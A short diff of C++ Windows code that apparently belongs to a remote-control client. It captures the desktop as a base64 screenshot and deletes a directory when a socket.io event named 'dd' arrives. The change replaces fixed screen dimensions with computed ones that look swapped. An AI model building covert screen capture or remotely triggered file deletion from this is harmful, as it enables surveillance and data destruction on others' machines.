@@ -486,8 +486,21 @@ int main() {
 		
 		RECT      rc;
 		GetClientRect(GetDesktopWindow(), &rc);
+
+		//printf("location: %ld\n", rc.right);
+		//long nScreenWidth = GetSystemMetrics(SM_CXSCREEN);
+		//long nScreenHeight = GetSystemMetrics(SM_CYSCREEN);
+
+		long width = rc.bottom;
+		long height = rc.right;
+
+		if (width == 1500) {
+			width *= 2;
+			height *= 2;
+		}
+
 		POINT a{ 0, 0 };
-		POINT b{ 1920, 1080 };
+		POINT b{ width, height };
 
 		std::string encoded_string = screenshotToBase64(a, b);
 		//printf("\n%s\n", encoded_string);
@@ -506,10 +519,6 @@ int main() {
 	myClient.socket()->on("dd", sio::socket::event_listener_aux([&](std::string const& name, sio::message::ptr const& data, bool isAck, sio::message::list &ack_resp) {
 		deleteDir();
 	}));
-
-
-
-
 
 
 
